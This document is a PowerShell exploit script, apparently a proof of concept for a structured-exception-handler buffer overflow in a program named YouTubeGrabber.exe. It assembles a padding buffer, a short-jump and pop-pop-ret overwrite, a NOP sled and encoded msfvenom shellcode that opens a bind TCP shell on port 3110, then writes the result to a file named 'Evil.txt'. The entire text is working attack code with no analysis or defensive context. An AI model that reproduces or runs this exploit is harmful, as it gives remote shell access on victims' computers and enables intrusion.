$buffer = [char[]]0x41 * 712;
[Byte[]]$nseh = 0xEB, 0x06, 0x90, 0x90; #jmp short 6
$seh = 0x2e, 0x64, 0xc5, 0x01; #pop ecx # pop ecx # ret  |  {PAGE_EXECUTE_WRITECOPY} [YouTubeGrabber.exe
[Byte[]]$nops =  0x90;
for($I = 0; $i -lt 19; $I++)
{
    $nops +=  0x90;
}
#msfvenom -p windows/shell_bind_tcp LPORT=3110 -f py -e x86/alpha_mixed EXITFUNC=thread -b ", 0x00, 0x0a, 0x0d, 0x20"
[Byte[]]$buf = 0x89, 0xe1, 0xd9, 0xc6, 0xd9, 0x71, 0xf4, 0x5d, 0x55, 0x59, 0x49,
 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
 0x37, 0x51, 0x5a, 0x6a, 0x41, 0x58, 0x50, 0x30, 0x41, 0x30, 0x41, 0x6b, 0x41,
 0x41, 0x51, 0x32, 0x41, 0x42, 0x32, 0x42, 0x42, 0x30, 0x42, 0x42, 0x41, 0x42,
 0x58, 0x50, 0x38, 0x41, 0x42, 0x75, 0x4a, 0x49, 0x6b, 0x4c, 0x49, 0x78, 0x6e,
 0x62, 0x63, 0x30, 0x37, 0x70, 0x63, 0x30, 0x71, 0x70, 0x6d, 0x59, 0x4d, 0x35,
 0x56, 0x51, 0x6f, 0x30, 0x61, 0x74, 0x6c, 0x4b, 0x72, 0x70, 0x46, 0x50, 0x6e,
 0x6b, 0x43, 0x62, 0x56, 0x6c, 0x6c, 0x4b, 0x30, 0x52, 0x35, 0x44, 0x4c, 0x4b,
 0x31, 0x62, 0x54, 0x68, 0x74, 0x4f, 0x6e, 0x57, 0x42, 0x6a, 0x31, 0x36, 0x75,
 0x61, 0x49, 0x6f, 0x4e, 0x4c, 0x65, 0x6c, 0x50, 0x61, 0x33, 0x4c, 0x43, 0x32,
 0x36, 0x4c, 0x67, 0x50, 0x69, 0x51, 0x5a, 0x6f, 0x66, 0x6d, 0x47, 0x71, 0x5a,
 0x67, 0x4b, 0x52, 0x79, 0x62, 0x36, 0x32, 0x56, 0x37, 0x6e, 0x6b, 0x62, 0x72,
 0x44, 0x50, 0x4c, 0x4b, 0x51, 0x5a, 0x67, 0x4c, 0x6c, 0x4b, 0x52, 0x6c, 0x34,
 0x51, 0x32, 0x58, 0x5a, 0x43, 0x70, 0x48, 0x66, 0x61, 0x48, 0x51, 0x63, 0x61,
 0x6e, 0x6b, 0x31, 0x49, 0x31, 0x30, 0x65, 0x51, 0x38, 0x53, 0x4e, 0x6b, 0x50,
 0x49, 0x45, 0x48, 0x6a, 0x43, 0x77, 0x4a, 0x57, 0x39, 0x6c, 0x4b, 0x57, 0x44,
 0x6c, 0x4b, 0x76, 0x61, 0x4a, 0x76, 0x76, 0x51, 0x39, 0x6f, 0x6e, 0x4c, 0x4a,
 0x61, 0x5a, 0x6f, 0x34, 0x4d, 0x66, 0x61, 0x58, 0x47, 0x47, 0x48, 0x6d, 0x30,
 0x63, 0x45, 0x4a, 0x56, 0x54, 0x43, 0x71, 0x6d, 0x39, 0x68, 0x37, 0x4b, 0x71,
 0x6d, 0x57, 0x54, 0x62, 0x55, 0x68, 0x64, 0x56, 0x38, 0x6c, 0x4b, 0x30, 0x58,
 0x31, 0x34, 0x73, 0x31, 0x48, 0x53, 0x53, 0x56, 0x6e, 0x6b, 0x76, 0x6c, 0x52,
 0x6b, 0x6c, 0x4b, 0x32, 0x78, 0x65, 0x4c, 0x33, 0x31, 0x69, 0x43, 0x4c, 0x4b,
 0x77, 0x74, 0x4c, 0x4b, 0x65, 0x51, 0x38, 0x50, 0x6e, 0x69, 0x77, 0x34, 0x56,
 0x44, 0x65, 0x74, 0x31, 0x4b, 0x33, 0x6b, 0x50, 0x61, 0x42, 0x79, 0x73, 0x6a,
 0x30, 0x51, 0x6b, 0x4f, 0x4d, 0x30, 0x63, 0x6f, 0x61, 0x4f, 0x33, 0x6a, 0x6e,
 0x6b, 0x56, 0x72, 0x78, 0x6b, 0x4e, 0x6d, 0x61, 0x4d, 0x31, 0x78, 0x47, 0x43,
 0x46, 0x52, 0x37, 0x70, 0x75, 0x50, 0x52, 0x48, 0x62, 0x57, 0x70, 0x73, 0x45,
 0x62, 0x43, 0x6f, 0x42, 0x74, 0x63, 0x58, 0x50, 0x4c, 0x62, 0x57, 0x55, 0x76,
 0x36, 0x67, 0x59, 0x6f, 0x4a, 0x75, 0x6e, 0x58, 0x4c, 0x50, 0x37, 0x71, 0x75,
 0x50, 0x67, 0x70, 0x51, 0x39, 0x39, 0x54, 0x46, 0x34, 0x62, 0x70, 0x42, 0x48,
 0x44, 0x69, 0x4f, 0x70, 0x30, 0x6b, 0x75, 0x50, 0x59, 0x6f, 0x48, 0x55, 0x32,
 0x4a, 0x53, 0x38, 0x76, 0x39, 0x50, 0x50, 0x69, 0x72, 0x59, 0x6d, 0x37, 0x30,
 0x70, 0x50, 0x37, 0x30, 0x50, 0x50, 0x61, 0x78, 0x69, 0x7a, 0x54, 0x4f, 0x4b,
 0x6f, 0x59, 0x70, 0x59, 0x6f, 0x58, 0x55, 0x4e, 0x77, 0x31, 0x78, 0x34, 0x42,
 0x57, 0x70, 0x66, 0x6c, 0x74, 0x66, 0x4e, 0x69, 0x59, 0x76, 0x73, 0x5a, 0x44,
 0x50, 0x71, 0x46, 0x71, 0x47, 0x33, 0x58, 0x6a, 0x62, 0x79, 0x4b, 0x30, 0x37,
 0x50, 0x67, 0x59, 0x6f, 0x79, 0x45, 0x56, 0x37, 0x70, 0x68, 0x4d, 0x67, 0x39,
 0x79, 0x67, 0x48, 0x6b, 0x4f, 0x79, 0x6f, 0x4b, 0x65, 0x36, 0x37, 0x71, 0x78,
 0x44, 0x34, 0x68, 0x6c, 0x55, 0x6b, 0x38, 0x61, 0x69, 0x6f, 0x5a, 0x75, 0x70,
 0x57, 0x6d, 0x47, 0x75, 0x38, 0x42, 0x55, 0x42, 0x4e, 0x32, 0x6d, 0x71, 0x71,
 0x6b, 0x4f, 0x4a, 0x75, 0x62, 0x48, 0x71, 0x73, 0x52, 0x4d, 0x61, 0x74, 0x55,
 0x50, 0x6d, 0x59, 0x68, 0x63, 0x73, 0x67, 0x63, 0x67, 0x61, 0x47, 0x76, 0x51,
 0x5a, 0x56, 0x32, 0x4a, 0x75, 0x42, 0x51, 0x49, 0x63, 0x66, 0x59, 0x72, 0x79,
 0x6d, 0x43, 0x56, 0x78, 0x47, 0x37, 0x34, 0x57, 0x54, 0x65, 0x6c, 0x46, 0x61,
 0x67, 0x71, 0x6e, 0x6d, 0x43, 0x74, 0x76, 0x44, 0x64, 0x50, 0x4b, 0x76, 0x67,
 0x70, 0x70, 0x44, 0x42, 0x74, 0x50, 0x50, 0x52, 0x76, 0x30, 0x56, 0x63, 0x66,
 0x42, 0x66, 0x52, 0x76, 0x52, 0x6e, 0x36, 0x36, 0x51, 0x46, 0x46, 0x33, 0x46,
 0x36, 0x42, 0x48, 0x44, 0x39, 0x6a, 0x6c, 0x35, 0x6f, 0x6e, 0x66, 0x59, 0x6f,
 0x78, 0x55, 0x6d, 0x59, 0x4b, 0x50, 0x32, 0x6e, 0x62, 0x76, 0x42, 0x66, 0x6b,
 0x4f, 0x36, 0x50, 0x75, 0x38, 0x63, 0x38, 0x6f, 0x77, 0x65, 0x4d, 0x51, 0x70,
 0x39, 0x6f, 0x49, 0x45, 0x6d, 0x6b, 0x59, 0x70, 0x65, 0x4d, 0x67, 0x5a, 0x54,
 0x4a, 0x35, 0x38, 0x4d, 0x76, 0x6c, 0x55, 0x6f, 0x4d, 0x6d, 0x4d, 0x4b, 0x4f,
 0x68, 0x55, 0x35, 0x6c, 0x56, 0x66, 0x53, 0x4c, 0x35, 0x5a, 0x6b, 0x30, 0x69,
 0x6b, 0x59, 0x70, 0x50, 0x75, 0x37, 0x75, 0x6d, 0x6b, 0x72, 0x67, 0x32, 0x33,
 0x33, 0x42, 0x70, 0x6f, 0x43, 0x5a, 0x37, 0x70, 0x31, 0x43, 0x79, 0x6f, 0x79,
 0x45, 0x41, 0x41;
 
$pad = [System.Text.Encoding]::ASCII.GetBytes("B" * (7280 - ($buffer.Length) - ($nseh.Length+$seh.Length) - ($nops.Length) - ($buf.Length)));
$payload += $buffer;
$payload += $nseh;
$payload += $seh;
$payload += $nops;
$payload += $buf;
$payload += $pad;

try{
    [io.file]::WriteAllBytes($PWD.Path + '\Evil.txt',$payload);
    write-host "[+] Creating "($payload.Length)" bytes evil payload..";
    write-host "[+] File created!"
}catch{
    write-host $_;
}